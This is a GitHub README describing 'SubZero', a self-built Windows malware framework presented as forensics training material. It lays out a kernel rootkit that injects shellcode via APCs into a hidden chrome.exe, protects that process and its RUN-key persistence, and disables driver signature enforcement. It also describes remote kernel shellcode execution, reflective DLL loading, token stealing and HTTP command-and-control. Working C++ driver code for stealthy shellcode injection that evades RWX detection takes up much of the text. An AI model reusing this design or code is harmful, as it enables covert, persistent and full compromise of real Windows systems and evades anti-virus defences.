# The SubZero Project  

SubZero is a multi-staged malware that contains a kernel mode rootkit and a remote system shell. Part of the malware capabilities are remote kernel mode shellcode execution and reflective DLL loading, which should grant full control over a compromised system.  
  
# Disclaimer  
  
**This repository does not promote any hacking related activity. All the information in this repository is for educational purposes only.**  
  
I take **NO** responsibility and/or liability for how you choose to use any of the source code available here. By using any of the files, you acknowledge that **you are using at your own risk**.  
  
In addition, this repository also contain a use of Microsoft's undocumented functions and structures. Using those is extremely dangerous and not recommended. **I do not promote this kind of code in any way**.  
  
# Introduction & Goal  
  
As a security researcher, I have encountered and analyzed various user-mode malwares in recent times. While some of them were more challenging than others, they were all designed with the same common ground in mind - **User Mode**.  
My colleagues and I wanted to put our forensics skills to the test in an unknown environment like the kernel space. We started by fully [reverse-engineering an APT driver](https://github.com/DanielAvinoam/BlackEnergyV2-Driver-Reverse-Engineering) from 2008 - A pretty good start, but still far from a modern day kernel mode threat.  
Instead of searching for a modern malicious driver to disassemble, which are extremely rare anyway, I figured it would be more beneficial to challenge my kernel programming skills and write the driver myself (After all, you should always "know your enemy")  
This driver will accompany a few other user-mode modules that together will create a complete attack vector from start to finish. The researchers will receive a [memory image](https://drive.google.com/file/d/199RgloKz4Ki6HklD5pczlNBGX-YRFd7W/view?usp=sharing) of a compromised system and will need to form an accurate status report of what happened as fast as possible.  
 
This project's main component is its driver - meaning the rest of the user-mode modules might have some compromises and will not take every scenario into account.  
The code is written in `C++ 17` and all of its features. The user mode components designed with OOP in mind, In future versions the driver should be updated as well.  
  
  
# The Gameplan  
  
Before starting to write any code, the general flow of the attack should be decided.  
When I started this project I had a vision of a user-mode process that would be able communicate with a remote server, while a driver will cover its tracks and make it look as legitimate as possible. 
What process can be found in almost every computer today and connects to the internet regularly? **chrome.exe**.

So my initial plan went like this - load a driver. the driver will load a malicious library into a chrome process. this library will connect to a remote server. sounds easy, right? well, it turns out it is way more complicated than this.
Loading a user-mode library from kernel space is more than just a call to `LoadLibrary`. It requires a lot of work with undocumented functions and structures, and in such a delicate environment this far from ideal - a different approach should be taken. 

A solution driver programmers found is to execute a user-mode shellcode using an APC, similar to a malware. Many anti-virus programs work like this in order to load their DLLs into every opened process on the system.
How can a driver know when a new process is created? The kernel provides an API of callback function registration for various events, one of them is the `PsSetCreateProcessNotifyRoutineEx` function: 
```cpp
NTSTATUS PsSetCreateProcessNotifyRoutineEx(
  PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
  BOOLEAN                           Remove
);
```
The `NotifyRoutine` will be invoked whenever a new process is created. In this function the driver needs to save the PID of the created process, and capture its first thread - This can be done using another callback registration function named  `PsSetCreateThreadNotifyRoutineEx` that works similarly to the one prior. Before a new thread executes, it calls the `TestAlert` function, that flushes its APC queue. This guarantee us that our shellcode will be executed before the process' main thread.
Prior to the APC queueing, the shellcode should be allocated to the process' address spaces. This is possible only from the context of that process and since callback functions are executing by an arbitrary thread, another APC should be queued - this time a kernel one.
The following graph demonstrates the flow of events:

![Driver Flow](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/DriverFlow.JPG "Driver Flow")

There is a crucial problem in this plan though - The malicious DLL execution is dependent on the execution of its host chrome process. We need to create a chrome process of our own and protect it from being killed. To make it look legitimate as possible, explorer.exe's PID should be our target PID. The creation of the chrome process can be done using the same aforementioned method ( starting from an explorer.exe thread, since explorer.exe is singular and will already be running when our driver will be loaded). 
For protecting this process the kernel generously offers us another callback registration function named `ObRegisterCallbacks`, which can give us a notification before an object handle create/open/duplicate operation - All there's left for us to do is to remove the `PROCESS_TERMINATE` access from the user-returned handle.
This solution is not perfect though, According to [@zodiacon](https://github.com/zodiacon)'s Windows Kernel Programming book:

> Even with this protection, clicking on a window's close button or selecting a termination option from within the application's interface would terminate the process. This is because it's being done internally by calling `ExitProcess`, Which does not involve any handles. 
This means that the protection mechanism is essentially good for processes without user interface.

This leads us to our second problem - chrome's GUI window. The suddenly-popped window will be visible for the system's user and can be closed using the window's X button. My first solution was creating the process with the `CreateProcess` function and a `CREATE_NO_WINDOW` flag sent to it. Unfortunately either this or using chrome's CMD arguments for hidden it's windows did not work. Starting the process suspended and manipulate its memory space would might work but also be loud and will defeat the point of having a stealthy driver in the first place. 

That's where I had an idea - what if my library's `DllMain` will never return to the caller, thus blocking the APC function and the initial call to `TestAlert`? As I suspected, this means the initial chrome thread will not start, and the chrome window will not be created - perfect.

To fully take advantage of the kernel module, It should provide its user-mode clients exclusive access to the system resources and structures. I tried to demonstrate these capabilities with it's 3 IOCTL's - changing a process' PPID, setting a process' token to the system's one and most importantly, executing a position independent kernel shellcode.

## User Mode

The two other user-mode components are the malware's loader and the loaded library itself.
The loader's designation is pretty straight forward - drop the malicious files to the file system, then load the driver. 
To bypass windows' driver signature enforcement I used [DSEFix](https://github.com/hfiref0x/DSEFix)'s source code, which utilizes the [WinNT/Turla](https://github.com/hfiref0x/TDL) exploit to disable the system's signature requirement variable.

>**Note**: Starting from windows 8.1 PatchGuard will detect this variable manipulation and cause a BSOD after an almost random amount of time (could be instantaneous or after hours) -  making this loading technique far from ultimate.

In order to load the driver after a system restart, the loader will add itself as a value to the registry RUN key. The driver will then monitor and prevent the deletion of this value by using a similar object notification function to the one mentioned earlier. 

The library will fetch data from a remote server every 5 seconds using HTTP GET requests, and send back any results using HTTP POST requests. Apart from remotely removing the malware from the system without leaving any trace, the attacker would be able to send a kernel shellcode that will be passed directly to the driver and be executed, or send a DLL file that will be loaded reflectively to chrome's address space. 

The following diagram summarizes the complete attack flow:

![Complete Attack Flow](https://github.com/DanielAvinoam/TheSubZeroProject/blob/main/Images/CompleteAttackFlow.jpg "Complete Attack Flow")

**With this framework installed on a system an attacker can basically achieve anything.** 

# Code Walkthrough  

| Project                                   | Description 
| ----------------------------------------- | ------------ 
| DSEFix           							            |  [DSEFix](https://github.com/hfiref0x/DSEFix)'s source code
| KernelPISCreator 							            | Sample driver for creating and testing position independent kernel shellcode.   
| SubZeroDLL (eventlog_provider.dll)        | The library loaded into chrome.exe    
| SubZeroDriver (NdisNet.sys)   			      | The rootkit driver itself.
| SubZeroLoader (GoogleUpdateClient.exe)    | The driver loader, executes on system boot.
| SubZeroServer    							            | Python HTTP server that provides a small command line interface for making actions to the client.
| SubZeroReflectivleyLoadedDLL     		    	| Sample DLL that will be sent to the client from the remote server and pops a message box on load.      
| SubZeroCleanup   							            | Static library responsible for removing the malware from the system. Can be called from the loader (in case of an error) or from the DLL (in case of a remote command from the server)
| SubZeroUtils     							            |  Static library containing most of the utility classes used in the project    

## Driver 

Starting from the `DriverEntry` function, the driver initializes the usual structurtes (`DeviceObject`, symbolic link etc..) and register its callback and dispatch functions. This is followed by the seeking of explorer's PID, which should be present in the system's process list (`FindProcessByName` simply traverse the system's `EPROCESS` list and compare each entry's name to the inputed one). In case it doesn't, the thread sleeps for 5 seconds and tries again:
```cpp
// Search for explorer Process
PEPROCESS explorerProcess;
LARGE_INTEGER interval;
interval.QuadPart = -50000000; // 5 Seconds / 100 nanoseconds - in RELATIVE time
do {
	if (NT_SUCCESS(FindProcessByName(PARENT_PROCESS_NAME, &explorerProcess))) 
	{
		g_Globals.ExplorerPID = ::HandleToULong(::PsGetProcessId(explorerProcess));
		KdPrint((DRIVER_PREFIX "[+] explorer.exe found. PID: %d\n", g_Globals.ExplorerPID));
		break;
	}
	KdPrint((DRIVER_PREFIX "[-] explorer.exe not found. Trying again in 5 seconds\n"));
	::KeDelayExecutionThread(KernelMode, false, &interval);
} while (true);
...
```
 Next, an explorer thread should be catched. Using the `OnThreadNotify` callback function the driver checks whether the newley created thread is explorer's. Once found, the driver registers the function `OnProcessNotify` for process creation events and the function `InjectUsermodeShellcodeAPC` is then queued to that thread's APC queue, with a chrome-launching shellcode as its parameter:
```cpp
// Search for an explorer Thread
if (pid == g_Globals.ExplorerPID) 
{
	// Check if a launcher Thread was already found
	if (g_Globals.ExplorerLauncherThreadID != 0)
		return;

	KdPrint((DRIVER_PREFIX "[+] explorer launcher Thread catched. TID: %d\n", tid));
	g_Globals.ExplorerLauncherThreadID = tid;

	// Register for Process notifications in order to catch the ghost chrome launch
	const auto status = ::PsSetCreateProcessNotifyRoutineEx(OnProcessNotify, FALSE);

	if (!NT_SUCCESS(status)) {
	KdPrint((DRIVER_PREFIX "[-] Failed to register Process callback (status=0x%08X)\n", 		status));
	return;
	}
	
	// Queue APC for chrome creation
	if (::ExAcquireRundownProtection(&g_Globals.RundownProtection))
	{
		::PsLookupThreadByThreadId(ThreadId, &thread);
		if (!NT_SUCCESS(QueueAPC(thread, KernelMode, [](PVOID, PVOID, PVOID) { InjectUsermodeShellcodeAPC(LaunchChromeShellcode, ARRAYSIZE(LaunchChromeShellcode)); })))
			::ExReleaseRundownProtection(&g_Globals.RundownProtection);
	}
	else KdPrint((DRIVER_PREFIX "[-] Error acquiring rundown protection\n"));
}
...
```
Notice the use of the global `RundownProtection` variable  - drivers can use run-down protection to safely access objects in shared system memory that are created and deleted by another kernel-mode driver. In our case, the variable is acquired before each APC queueing and it's the APC's job to release the object right before the function finishes. 
The `DriverUnload` function will get blocked by the call to `ExWaitForRundownProtectionRelease`, which will wait for the `RundownProtection` to be released (if acquired). This is how the driver guarantee that it will not be unloaded while an APC is queued for execution, thus preventing a BSOD.

>**Note**: You might also noticed the lambda expression sent to the `QueueAPC` function. This is a trick to bypass the `KeInitializeApc` requirement for declaring a `PKNORMAL_ROUTINE` as the APC function and avoid  casting its parameters to `PVOID` (which in some cases might cause some problems). 

Jumping into `InjectUsermodeShellcodeAPC`, the function receives a shellcode pointer and its size. Since this function executes in the target process' context, it starts with allocating space equal to the shellcode's size:
```cpp
void InjectUsermodeShellcodeAPC(const UCHAR* Shellcode, SIZE_T ShellcodeSize) 
{
	KdPrint((DRIVER_PREFIX "[+] InjectUsermodeShellcodeAPC invoked\n"));
	SIZE_T pageAlligndShellcodeSize = ShellcodeSize;
	auto* const hProcess = ZwCurrentProcess();

	// Allocate Shellcode's memory
	void* address{};
	auto status = ::ZwAllocateVirtualMemory(
		hProcess,
		&address,
		0,
		&pageAlligndShellcodeSize,
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READ);

	if (!NT_SUCCESS(status)) 
	{
	KdPrint((DRIVER_PREFIX "[-] ZwAllocateVirtualMemory failed (0x%08X)\n", status));
	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
	return;
	}
	...
```
In a standard code execution attack this space would be allocated with `EXECUTE_READWRITE` protection, in order to copy and then execute the code. This will alarm most anti-virus programs and exposing our malware - that's where the driver comes into play. 
initially, the space is allocated with `PAGE_EXECUTE_READ`, then an [`MDL`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/using-mdls)  structure is being allocated and locked on that space, this time with `PAGE_READWRITE` protection. Using this structure  the driver can copy the shellcode to the allocated space, while the memory `VAD` protection stays as non-writable:
```cpp
	PMDL mdl;
	PVOID mappedAddress = nullptr;
	bool successful = false;
	do
	{
	
	// Allocate MDL
	mdl = ::IoAllocateMdl(
		address,
		static_cast<ULONG>(pageAlligndShellcodeSize),
		false,
		false,
		nullptr);
	if (!mdl) break;
	
	::MmProbeAndLockPages(
	mdl,
	KernelMode,
	IoReadAccess);
	
	// Lock to kernel memory
	mappedAddress = ::MmMapLockedPagesSpecifyCache(
		mdl,
		KernelMode,
		MmNonCached,
		nullptr,
		false,
		NormalPagePriority);	
	if (!mappedAddress) break;
	
	// Change protection
	status = ::MmProtectMdlSystemAddress(mdl, PAGE_READWRITE);
	if (NT_SUCCESS(status))
	
	successful = true;
	
	} while (false);
...
```
  After the shellcode gets copied, a user-mode APC is queued with the new allocation's address and the `RundownProtection` variable is released:
```cpp
	  // Copy Shellcode
	__try
	{
		::RtlCopyMemory(mappedAddress, Shellcode, ShellcodeSize);
		KdPrint((DRIVER_PREFIX "[+] Shellcode copied to (0x%p). Size: %d bytes\n", address, 				(int)ShellcodeSize));
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		KdPrint((DRIVER_PREFIX "[-] Error copying Shellcode to mapped address - (0x%p)\n", 	mappedAddress));
	}

	// Free MDL pages
	::MmUnmapLockedPages(mappedAddress, mdl);
	::MmUnlockPages(mdl);
	::IoFreeMdl(mdl);
	
	QueueAPC(::KeGetCurrentThread(), UserMode, static_cast<PKNORMAL_ROUTINE>(address));
	
	// Kernel APC finished - release RP
	::ExReleaseRundownProtection(&g_Globals.RundownProtection);
}
```
## DLL  
  
## Loader
  
## Cleanup  
  
## Server  
  
# Executing  
  
# Special Thanks and Sources
